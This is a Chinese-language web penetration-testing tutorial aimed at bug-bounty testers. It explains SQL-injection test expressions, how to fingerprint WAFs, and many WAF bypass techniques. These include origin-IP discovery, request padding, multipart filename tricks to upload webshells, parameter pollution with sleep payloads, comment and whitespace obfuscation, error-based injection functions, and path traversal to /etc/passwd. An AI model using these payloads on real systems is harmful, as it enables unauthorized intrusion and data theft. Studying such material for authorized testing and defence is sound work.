\u7ef4\u8270\uff0c\u600e\u4e48\u53bb\u5224\u65ad\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u8fdb\u800c\u6839\u636e\u6f0f\u6d1e\u83b7\u53d6\u8bc1\u636e\u6570\u636e\uff0c\u8fd9\u4e2a\u662f\u4e2a \u4f17\u6d4b\u5e73\u53f0\u9009\u624b\u7684\u75db\u70b9 1.\u6570\u636e\u5e93\u5c42\u9762\u57fa\u7840\u94fa\u57ab \u00b6 \u5224\u65ad\u6027SQL\u8bed\u53e5\u7684\u5f62\u5f0f \u6761\u4ef6\u5224\u65ad\u51fd\u6570\u65b9\u6cd5\u5206\u6790 mysql if ( 1 = ( select 1 REGEXP if ( 1 = 1 , 1 , 0x00 )), 1 , 1 ) = 1 IFNULL ( ascii ( substr ( user (), 1 , 1 )) / ( 114 % ascii ( substr ( user (), 1 , 1 ))), 'yes\u2019) IFNULL(hex(substr(user(),1,1))/(114%hex(substr(user(),1,1))),' yes\u2019 ) IFNULL ( 1 / ( locate ( substr ( user (), 1 , 1 ), 'r' )), 'yes\u2019) IFNULL(1/(locate(right(left(lower(user()),1),1),' r ')),' yes\u2019 ) left ( user (), 1 ) = \"r\" ; if ( 1 = 1 , 1 , 1 ) oracle NVL ( TO_CHAR ( DBMS_XMLGEN . getxml ( 'select 1 from dual where 1337>1' )), '1' ) != 1 NVL2 ( NULLIF ( substr ( 'abc' , 1 , 1 ), 'ca' ), 1 , 2 ) = 1 INSTR ( 'abcd' , 'b' , 2 , 1 ) > 0 2018 - 10 - 21 \u2019 - decode ( 1 , 21 , 1 , to_date ( decode ( 1 , 1 , '' , 's' ), 'yyyy -mm-dd' )) - \u2019 to_date ( decode ( substr ( user , 1 , 1 ), 'a' , '' , 's' ), 'yyyy-mm-dd\u2019)) decode(sign(INSTR(USER,' A ', 2, 1)),0,to_number(' x ' ), 1 ) sqlserver PATINDEX ( 'Wa%25' , 'Washington' ) > 0 right ( left ( lower ( 'abc' ), 1 ), 1 ) = 'a\u2019 isnull(nullif(substring(' abc ',1,1),' a '),' c ')=' c ' regexp_like ( 1 ,( case when 1 = 1 then 1 else 0 x00end )) \u901a\u7528\u578b\u5224\u65adSQL\u8bed\u53e5 2.\u5c42\u5c42\u9012\u8fdb\u5206\u6790WAF\u6c42\u8bc1\u636e \u00b6 waf\u7684\u539f\u7406 \u00b6 WAF\u7684\u53d1\u5c55\u4e3b\u8981\u7ecf\u5386\u4e86IPS\u67b6\u6784\uff0c \u53cd\u5411\u4ee3\u7406 \uff0c\u900f\u660e\u4ee3\u7406\u548c\u6d41\u6a21\u5f0f\u3002 WAF\u5173\u952e\u6280\u672f \u00b6 WAF\u900f\u660e\u4ee3\u7406\u6280\u672f\u539f\u7406 waf\u901a\u4fe1 WAF\u4e3b\u8981\u4f1a\u66f4\u6539\u5982\u4e0b\u6570\u636e\u5305\u5185\u5bb9\u9879\uff1a \u5ba2\u6237\u7aefTCP\u6e90\u7aef\u53e3 \u5ba2\u6237\u7aef\u6e90MAC/\u670d\u52a1\u5668\u6e90MAC\u5730\u5740 \u957f\u77ed\u8fde\u63a5\u534f\u8bae\u7248\u672c MIME\u7c7b\u578b waf\u7684\u8bc6\u522b \u00b6 \u57fa\u4e8eCookie\u503c \u00b6 Citrix Netscaler\uff082013\u5e74\u4f7f\u7528\u5e7f\u6cdb\uff09 Citrix Netscaler\u201d\u4f1a\u5728HTTP\u8fd4\u56de\u5934\u90e8Cookie\u4f4d\u7f6e\u52a0\u5165\u201cns_af\u201d\u7684\u503c\uff0c\u53ef\u4ee5\u4ee5\u6b64\u5224\u65ad\u4e3aCitrix Netscaler\u7684WAF\uff0c\u56fd\u5185\u6b64\u7c7bWAF\u5f88\u5c11 F5 BIG IP ASM F5 BiG IP ASM\u4f1a\u5728Cookie\u4e2d\u52a0\u5165\u201cTS+\u968f\u673a\u5b57\u7b26\u4e32\u201d\u7684Cookie\u4fe1\u606f\uff0c \u57fa\u4e8eHTTP\u54cd\u5e94 \u00b6 Mod_Security Mod_Security\u662f\u4e3aApache\u8bbe\u8ba1\u7684\u5f00\u6e90Web\u9632\u62a4\u6a21\u5757\uff0c\u4e00\u4e2a\u6076\u610f\u7684\u8bf7\u6c42Mod_Security\u4f1a\u5728\u54cd\u5e94\u5934\u8fd4\u56de\u201c406 Not acceptable\u201d WebKnight WebKnight\u662f\u7528\u6765\u8bbe\u8ba1\u5728IIS\u4e0b\u9762\u4f7f\u7528\u7684WAF\u8bbe\u5907\uff0c\u8f83\u4e3a\u5e38\u89c1\u3002WebKnight\u4f1a\u5bf9\u6076\u610f\u7684\u8bf7\u6c42\u8fd4\u56de\u201c999 No Hacking\u201d F5 BIG IP F5 BIG IP\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201c419 Unknown\u201d\u7684\u4fe1\u606f dotDefender dotDefender\u7528\u6765\u9632\u62a4.net\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201cdotDefender Blocked Your Request\u201d \u7279\u5b9a\u8d44\u6e90\u6587\u4ef6 \u00b6 \u90e8\u5206\u7279\u5b9aWAF\u5728\u8fd4\u56de\u7684\u544a\u8b66\u9875\u9762\u542b\u7279\u5b9a\u7684CSS\u6216\u8005JS\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u5224\u65ad\u7684\u4f9d\u636e\uff0c\u8fd9\u7c7b\u60c5\u51b5\u5728WAF\u7c7b\u91cc\u6bd4\u8f83\u5c11\uff0c\u53ef\u5f52\u5e76\u5230HTTP\u54cd\u5e94\u4e2d\u3002 Sqlmap\u4e2dWaf\u68c0\u6d4b\u65b9\u6cd5\uff0881\u79cd\uff0c\u5305\u62ec360\uff0c\u5b89\u5168\u72d7\uff0csafe3\uff0c\u4e91\u9501\uff09 sqlmap . py - u \u201c http : // www . xxx . com \u201d -- identify - waf -- batch \u5168\u5c40\u8fc7waf\u7684\u51e0\u4e2a\u601d\u8003\u70b9 \u00b6 1. \u67b6\u6784\u5c42\u7ed5\u8fc7WAF \u00b6 1.1\u5bfb\u627e\u6e90\u7ad9 \u00b6 \u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\u6e90\u7ad9IP \u601d\u8def\u592a\u591a\uff0c\u90ae\u4ef6 \u7a77\u4e3eIP\u5730\u5740 \u5b8c\u6210\u4e00\u6b21\u56fd\u5185IP\u626b\u63cf\u53ea\u9700\u89818-9\u5c0f\u65f6 1.2\u5229\u7528\u540c\u7f51\u6bb5 \u00b6 \u4e91\u670d\u52a1\u5546\u4e70\u4e00\u53f0VPS\uff0c\u901a\u8fc7VPS\u653b\u51fb\u76ee\u6807\u7ad9\u70b9\uff0c\u56e0\u4e3a\u6d41\u91cf\u662f\u5c40\u57df\u7f51\uff0c\u53ef\u80fd\u4e0d\u7ecf\u8fc7WAF\u68c0\u6d4b\uff0c\u5b9e\u73b0\u7ed5\u8fc7 1.3\u5229\u7528\u8fb9\u754c\u6f0f\u6d1e \u00b6 \u5bfb\u627e\u5b50\u7ad9\u7684SSRF\u6f0f\u6d1e\u3002\u5982\u679c\u5b50\u7ad9\u8bbf\u95ee\u76ee\u6807\u7ad9\u4e0d\u7ecf\u8fc7WAF\u96c6\u7fa4\uff0c\u53ef\u4ee5\u5229\u7528SSRF\u6f0f\u6d1e\u6765\u7ed5\u8fc7WAF 2. \u8d44\u6e90\u9650\u5236\u89d2\u5ea6\u7ed5\u8fc7WAF \u00b6 WAF\u53ea\u68c0\u6d4b\u524d\u9762\u7684\u51e0K\u5b57\u8282\u30011M\u3001\u62162M\uff0c\u53ea\u9700\u8981\u5728POST BODY\u524d\u9762\u6dfb\u52a0\u8bb8\u591a\u65e0\u7528\u6570\u636e\uff0c\u628a\u653b\u51fbpayload\u653e\u5728\u6700\u540e\u5373\u53ef\u7ed5\u8fc7WAF\u68c0\u6d4b 3 \u534f\u8bae\u5c42\u9762\u7ed5\u8fc7WAF\u7684\u68c0\u6d4b \u00b6 3.1\u534f\u8bae\u8986\u76d6\u4e0d\u5168 \u00b6 Waf\u672a\u80fd\u8986\u76d6Content-Type: multipart/form-data\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u6216\u8005WAF\u4f1a\u8ba4\u4e3a\u5b83\u662f\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42\uff0c\u4ece\u800c\u53ea\u68c0\u6d4b\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u88ab\u7ed5\u8fc7 3.2\u534f\u8bae\u89e3\u6790\u4e0d\u6b63\u786e \u00b6 \u4f8b\u5982\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u4fee\u6539test.jpg/shell.php 3.3\u534f\u8bae\u89e3\u6790\u4e0e\u540eWEB\u5bb9\u5668\u7684\u534f\u8bae\u89e3\u6790\u4e0d\u4e00\u81f4 \u00b6 \u6587\u4ef6\u540d\u8986\u76d6 \u5728multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5757\u5b58\u5728\u591a\u4e2aContent-Disposition\uff0c\u5c06\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u7684filename\u503c\u4f5c\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7b2c\u4e00\u4e2a\u6587\u4ef6\u540dshell.123 \u7b2c\u4e8c\u4e2ashell.php \u4e0a\u4f20\u540e\u662fshell.php Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\"\" Content-Disposition: form-data;name=\"myfile\"; filename=\"t3.jsp\" \u5728\u4e00\u4e2aContent-Disposition \u4e2d\uff0c\u5b58\u5728\u591a\u4e2afilename Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\" \u9057\u6f0f\u6587\u4ef6\u540d \u5f53WAF\u9047\u5230\u201cname=\u201dmyfile\";;\u201d\u65f6\uff0c\u8ba4\u4e3a\u6ca1\u6709\u89e3\u6790\u5230filename\u3002\u800c\u540e\u7aef\u5bb9\u5668\u7ee7\u7eed\u89e3\u6790\u5230\u7684\u6587\u4ef6\u540d\u662ft3.jsp Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"\u3002 \u672a\u89e3\u6790\u6240\u6709\u6587\u4ef6 multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2aPOST\u8bf7\u6c42\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002\u5982\u56fe\uff0c\u8bb8\u591aWAF\u53ea\u68c0\u67e5\u7b2c\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ca1\u6709\u68c0\u67e5\u4e0a\u4f20\u7684\u6240\u6709\u6587\u4ef6\uff0c\u800c\u5b9e\u9645\u540e\u7aef\u5bb9\u5668\u4f1a\u89e3\u6790\u6240\u6709\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ea\u9700\u628apaylaod\u653e\u5728\u540e\u9762\u7684\u6587\u4ef6PART \u6587\u4ef6\u540d\u89e3\u6790\u517c\u5bb9\u6027 multipart\u534f\u8bae\u4e2d\uff0c\u6587\u4ef6\u540d\u7684\u5f62\u5f0f\u4e3a\u201cfilename=\"abc.php\"\u201d\u3002\u4f46\u662fTomcat\u3001PHP\u7b49\u5bb9\u5668\u89e3\u6790\u534f\u8bae\u65f6\u4f1a\u505a\u4e00\u4e9b\u517c\u5bb9\uff0c\u80fd\u6b63\u786e\u89e3\u6790 \u201dfilename=\"abc.php\u201d\u3001\u201dfilename=abc.php\u201d\u3001 \u201dfilename='abc.php\u2019\u201d\u3002\u800cWAF\u53ea\u6309\u7167\u534f\u8bae\u6807\u51c6\u53bb\u89e3\u6790\uff0c\u65e0\u6cd5\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u540e\u7aef\u5bb9\u5668\u80fd\u6b63\u786e\u83b7\u5f97\u6587\u4ef6\u540d\uff0c\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u573a\u666f\u7684\u7ed5\u8fc7\u5f62\u5f0f\uff1a Content-Disposition: form-data; name=\"file\"; filename=abc.php Content-Disposition: form-data; name=\"file\"; filename=\"abc.php Content-Disposition: form-data; name=\"file\"; filename='abc.php\u2019 3.4\u53c2\u6570\u6c61\u67d3 \u8bf7\u6c42\u4e2d\u5305\u542b2\u4e2a\u53c2\u6570\u540d\u76f8\u540c\u7684\u53c2\u6570typeid\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5e38\u53c2\u6570\u7684\u503c\u6b63\u5e38\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u624d\u662fpayload\u3002\u5982\u679cWAF\u89e3\u6790\u53c2\u6570\u4f7f\u7528\u7b2c\u4e00\u4e2a\u503c\uff0c\u6ca1\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\uff0c\u5c06\u5bfc\u81f4\u7ed5\u8fc7\u3002\u8fd9\u662f\u5f88\u4e45\u5f88\u4e45\u7684\u4e00\u4e2aCASE\uff0c\u73b0\u5728\u51e0\u4e4e\u6ca1\u6709WAF\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002 /forum.php\uff1f typeid=644&typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/ 'XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22 / 4. \u89c4\u5219\u5c42\u9762\u7684\u7ed5\u8fc7 \u00b6 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u7ed5\u8fc7WAF\u89c4\u5219\u4e3b\u8981\u601d\u8003\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\u5728\u60f3\u4ec0\u4e48\uff0c\u5bb9\u6613\u5ffd\u7565\u4ec0\u4e48\uff0c\u63a8\u65ad\u4e00\u4e9b\u53ef\u80fd\u7ed5\u8fc7\u7684\u65b9\u5f0f\uff0c\u7136\u540e\u591a\u6b21\u5c1d\u8bd5\u8fdb\u884c\u9a8c\u8bc1\u3002\u96b6\u5c5e\u4e8e\u6f0f\u6d1e\u5c42\u9762\u8fc7waf 4.1. SQL\u6ce8\u5165\u7ed5\u8fc7 \u00b6 \u7ed5\u8fc7SQL\u6ce8\u5165\u89c4\u5219\u4e3b\u8981\u5229\u7528WAF\u89c4\u5219\u672c\u8eab\u7684\u95ee\u9898\u3001\u672a\u8003\u8651\u5230SQL\u8bed\u6cd5\u53d8\u5f62\u3001\u53ca\u540e\u7aef\u6570\u636e\u5e93SQL\u8bed\u53e5\u8bed\u6cd5\u7279\u6027 \u6ce8\u91ca\u7b26\u7ed5\u8fc7 / xxx /\u662f\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5145\u5f53\u7a7a\u767d\u7b26\u3002\u56e0\u4e3a / /\u53ef\u4f7f\u5f97MySQL\u5bf9sql\u8bed\u53e5(union/ /select)\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u3002\u4e8b\u5b9e\u4e0a\u8bb8\u591aWAF\u90fd\u8003\u8651\u5230/**/\u53ef\u4ee5\u4f5c\u4e3a\u7a7a\u767d\u5206\uff0c\u4f46\u662fwaf\u68c0\u6d4b \u201c/*. */\u201d\u5f88\u6d88\u8017\u6027\u80fd\uff0c\u5de5\u7a0b\u5e08\u4f1a\u6298\u4e2d\uff0c\u53ef\u80fd\u5728\u68c0\u6d4b\u4e2d\u95f4\u5f15\u5165\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a/ \\w+*/\u3002\u6216\u8005\uff0cWAF\u53ef\u80fd\u53ea\u4e2d\u95f4\u68c0\u67e5n\u4e2a\u5b57\u7b26\u201c/*.{,n}*/\u201d\u3002\u6839\u636e\u4ee5\u4e0a\u60f3\u6cd5\uff0c\u53ef\u4ee5\u9010\u6b65\u6d4b\u8bd5\u7ed5\u8fc7\u65b9\u6cd5\uff1a \u5148\u6d4b\u8bd5\u6700\u57fa\u672c\u7684\uff1aunion/**/select \u518d\u6d4b\u8bd5\u4e2d\u95f4\u5f15\u5165\u7279\u6b8a\u5b57\uff1aunion/ aaaa%01bbs /select \u6700\u540e\u6d4b\u8bd5\u6ce8\u91ca\u957f\u5ea6\uff1aunion/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /select \u540c\u7406\uff0c\u5bf9\u4e8e/ !xxx /\uff0c\u53ef\u4ee5\u91c7\u53d6\u7c7b\u4f3c\u7684\u601d\u8def\u7ed5\u8fc7WAF\u3002 \u7a7a\u767d\u7b26\u7ed5\u8fc7 \u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c SQL\u6ce8\u5165\u89c4\u5219\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u201c\\s\u201d\u5339\u914d\u7a7a\u683c\uff0c\u4f8b\u5982\u201dselect\\s+union\u201d\u3002\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7a7a\u767d\u7b26\u4e0eMySQL\u7a7a\u767d\u7b26\u7684\u4e0d\u540c\u53ef\u7ed5\u8fc7WAF\u89c4\u5219\u3002\u5982\u4f55\u8fd9\u4e9bMySQL\u7684\u7279\u6027\uff1f\u901a\u8fc7fuzz,\u6bcf\u6b21\u66f4\u6539\u6b63\u5e38SQL\u8bed\u53e5\u7684\u67d0\u90e8\u5206\uff0c\u66ff\u6362\u4e3a\u5176\u4ed6\u5b57\u7b26\uff0c\u5224\u65ad\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5373\u53ef\u5224\u65ad\u51fa\u6765MySQL\u8bed\u6cd5\u7279\u6027\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5206\u6790MySQL\u8bcd\u6cd5\u6765\u53d1\u73b0\u8bed\u6cd5\u7279\u6027\uff0c\u4ece\u800c\u627e\u5230\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u5229\u7528\u7a7a\u767d\u7b26\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6d4b\u8bd5WAF\u65f6\u5c3d\u53ef\u80fd\u51cf\u5c11\u5176\u4ed6\u539f\u56e0\u7684\u5f71\u54cd\uff0c\u4f8b\u5982\u201dunion select\u201d\u88ab\u62e6\u622a\uff0c\u53ea\u9700\u628a\u4e2d\u95f4\u7a7a\u767d\u7b26\u66ff\u6362\u4e3a\u201d%250C\u201d, \u201c%25A0\u201d\u8fdb\u884c\u7ed5\u8fc7\u6d4b\u8bd5\u3002 union%250Cselect union%25A0select \u51fd\u6570\u5206\u9694\u7b26 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u6211\u4eec\u731c\u6d4b\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\uff0c\u53ef\u80fd\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\uff0c\u6216\u8005\u9057\u6f0f\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\u3002\u4f8b\u5982\u5339\u914d\u51fd\u6570\u201dconcat()\u201d\u7684\u89c4\u5219\u5199\u6cd5\uff0c\u201cconcat(\u201d\u6216\u8005\u201dconcat\\s*(\u201d\uff0c\u5c31\u6ca1\u6709\u8003\u8651\u5230\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u76f8\u5e94\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u5728\u7279\u6b8a\u4f4d\u7f6e\u5f15\u5165\u7279\u6b8a\u7684\u5206\u9694\u7b26\uff0c\u9010\u4e2a\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7279\u6b8a\u5206\u9694\u7b26\u53d1\u73b0\u4e5f\u662f\u901a\u8fc7Fuzz\u51fa\u6765\u7684\u3002 concat%2520( concat/**/( concat%250c( concat%25a0( \u4e3e\u4e00\u53cd\u4e09\uff0c\u5bfb\u627e\u7c7b\u4f3c\u7684\u5173\u952e\u4f4d\u7f6e\uff0cFuzz\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u66f4\u591a\u7684\u7ed5\u8fc7\u65b0\u65b9\u6cd5\u3002\u731c\u6d4b\u5de5\u7a0b\u5e08\u4eec\u5199\u89c4\u5219\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5bb9\u6613\u9057\u6f0f\u7684\u70b9\uff0c\u8fdb\u884c\u7ed5\u8fc7WAF\u68c0\u6d4b\u3002 \u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790 \u5229\u7528MySQL\u89e3\u6790\u6d6e\u70b9\u6570\u7684\u7279\u70b9\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u5339\u914d\u51fa\u5355\u8bcdunion\uff0c\u4f46\u662fMySQL\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u89e3\u6790\u51fa\u6d6e\u70b9\u6570\u3001sql\u5173\u952e\u5b57union\u3002 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 \u5229\u7528error-based\u8fdb\u884cSQL\u6ce8\u5165 Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u975e\u5e38\u5bb9\u6613\u88ab\u5ffd\u7565\uff0c\u5bfc\u81f4WAF\u89c4\u5219\u8fc7\u6ee4\u4e0d\u5b8c\u6574\u3002\u968f\u7740\u5bf9MySQL\u7814\u7a76\u8d8a\u6765\u8d8a\u6df1\uff0c\u88ab\u53d1\u73b0\u53ef\u7528\u4e8eerror-based SQL\u6ce8\u5165\u7684\u51fd\u6570\u8d8a\u6765\u8d8a\u591a\uff0c\u540c\u65f6\u4e5f\u7ed9\u7ed5\u8fc7WAF\u9020\u5c31\u4e86\u66f4\u591a\u673a\u4f1a\u3002\u5e38\u89c1\u7684\u51fd\u6570\uff1a extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() \u5229\u7528Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\u65f6\uff0c\u53ef\u4ee5\u7ed3\u5408\u51fd\u6570\u5206\u9694\u7b26\uff0c\u6216\u5176\u4ed6\u65b9\u6cd5\u7075\u6d3b\u8fd0\u7528\u3002 Mysql\u7279\u6b8a\u8bed\u6cd5 \u6700\u6709\u6548\u7684\u53d1\u73b0\u624b\u6bb5\uff0c\u8fd8\u662f\u53bb\u8bfb\u8bfbMySQL\u8bcd\u6cd5\u5206\u6790\u6e90\u4ee3\u7801\u3002\u548c\u534f\u8bae\u7ed5\u8fc7\u7c7b\u4f3c\uff0c\u6316\u6398SQL\u6807\u51c6\u4e0eMySQL\u7684\u8bcd\u6cd5\u5206\u6790\u5dee\u5f02\u662f\u53d1\u73b0WAF SQL\u6ce8\u5165\u7ed5\u8fc7\u7684\u6709\u6548\u624b\u6bb5\u3002\u4ee5\u4e0b\u662fMySQL\u8bed\u6cd5\u7684\u4e00\u4e2a\u7279\u5199(ps:\u4e0d\u662f\u6211\u53d1\u73b0\u7684)\uff1a select{x table_name}from{x information_schema.tables}; \u7efc\u5408\u5229\u7528\u5b9e\u4f8b \u4ee5\u4e0a\u90fd\u662fSQL\u6ce8\u5165\u7ed5\u8fc7\u4e2d\u7684\u6280\u672f\u70b9\uff0c\u5728\u5b9e\u9645\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u9700\u8981\u7075\u6d3b\u7efc\u5408\u5229\u7528\u624d\u80fd\u8fbe\u5230\u5b8c\u6574\u7ed5\u8fc7\uff0c\u8bfb\u53d6\u6570\u636e\u6570\u636e\u3002\u4ee5\u4e0b\u7ed9\u51fa\u5b8c\u6574\u7ed5\u8fc7WAF SQ\u6ce8\u5165\u68c0\u6d4b\u7684\u5b9e\u4f8b\u3002\u5982\u56fe\uff0c\u672c\u4f8b\u4e2d\u7efc\u5408\u591a\u4e2a\u7ed5\u8fc7\u6280\u672f\u70b9\uff0c\u6700\u7ec8\u5b9e\u73b0\u5b8c\u6574\u7ed5\u8fc7\u5b9e\u73b0\u8bfb\u53d6\u6570\u636e\u3002 \u5229\u7528\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7union select \u7684\u68c0\u6d4b\u3002 \u540c\u6837\uff0c\u51fd\u6570\u5206\u9694\u7b26\u601d\u60f3\u96c6\u548c\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57from\u7684\u68c0\u6d4b\u3002 \u6700\u540e\u7a7a\u767d\u5206\u5206\u5272\u7ed5\u8fc7INFORMATION_SCHEMA.TABLES\u7684\u68c0\u67e5 4.2.\u6587\u4ef6\u5305\u542b \u00b6 \u6587\u4ef6\u5305\u542b\u5206\u4e3a\u76f8\u5bf9\u8def\u5f84\u3001\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u3002\u5728\u76f8\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u4e2d\uff0c\u6700\u7ec8\u6839\u636eLinux\u865a\u62df\u6587\u4ef6\u7cfb\u7edf(vfs)\u7684\u89c4\u5219\u67e5\u627e\u6587\u4ef6\uff0c\u901a\u8fc7\u5206\u6790vfs\u7684\u6587\u4ef6\u8def\u5f84\u89e3\u6790\u89c4\u5219\uff0c\u63d0\u53d6\u5176\u4e2d\u89c4\u5219\u7279\u70b9\uff0c\u7528\u8fd9\u4e9b\u7279\u70b9\u53bb\u7ed5\u8fc7WAF\u3002\u5728\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u5305\u542b\u4e2d\uff0c\u4e3b\u8981\u662f\u6839\u636e\u653b\u51fb\u573a\u666f\uff0cWAF\u672a\u8fc7\u6ee4\u4e00\u4e9b\u534f\u8bae\u3001\u672a\u8fc7\u6ee4\u67d0\u4e9b\u7279\u6b8a\u8def\u5f84\u3002 \u76f8\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 \u5199WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u65f6\uff0c\u5982\u679c\u68c0\u6d4b\u5355\u4e00\u7684\u201d../\u201d\uff0c\u8bef\u62a5\u4f1a\u975e\u5e38\u591a\uff0c\u6240\u4ee5WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u901a\u5e38\u4f1a\u68c0\u6d4b\u8fde\u7eed\u7684\u201c../\"\u3002\u6839\u636evfs\u89e3\u6790\u8def\u5f84\u7684\u8bed\u6cd5\uff0c\u89e3\u6790\u5230\u201c//\u201d\u6587\u4ef6\u8def\u5f84\u4e0d\u53d8\uff0c\u89e3\u6790\u5230\u201c/./\u201d\u6587\u4ef6\u8def\u5f84\u4f9d\u7136\u3002 \u901a\u8fc7\u907f\u514d\u8fde\u7eed\u7684\"../\"\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u3002Eg: ././..///./.././/../etc//passwd\uff0c\u5b83\u7b49\u4ef7\u4e8e../../../etc/passwd \u7edd\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 WAF\u6ca1\u6709\u8003\u8651\u5230\u8def\u5f84\u4e2d\u63d2\u5165\u201c/./\u201d\u3001\u201c//\u201d\u5bf9\u4e8evfs\u89e3\u6790\u8def\u5f84\u662f\u7b49\u4ef7\u7684\uff0c\u5bfc\u81f4\u53ef\u88ab\u7ed5\u8fc7\u3002\u4f8b\u5982 /etc/./passwd \u4e0e /etc/passwd \u662f\u7b49\u4ef7\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u201c/./\u201d\u3001\u201c//\u201d\u8fdb\u884c\u7ed5\u8fc7\uff0ceg. /etc///.//././/passwd\u3002 \u5bf9\u4e8e\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\uff0cWAF\u4e00\u822c\u4f1a\u62e6\u622a\u5e38\u89c1\u8def\u5f84\uff0c\u800c\u4e0d\u4f1a\u9632\u5fa1\u6240\u6709\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u56e0\u6b64\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7684\u8def\u5f84\u4e0b\u4e00\u4e9b\u6587\u4ef6\uff0c\u4f8b\u5982/usr/local/nginx/conf/nginx.conf\u3002 \u5982\u679cWAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u68c0\u67e5\u5f00\u59cb\u8def\u5f84\u4e3aLinux\u7684\u76ee\u5f55\u540d\uff0c\u53ef\u4ee5\u91c7\u7528/wtt/../\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u68c0\u6d4b\u3002 \u4f8b\u5982\uff0c\u201c/wtt/../etc/passwd\u201d\uff0c 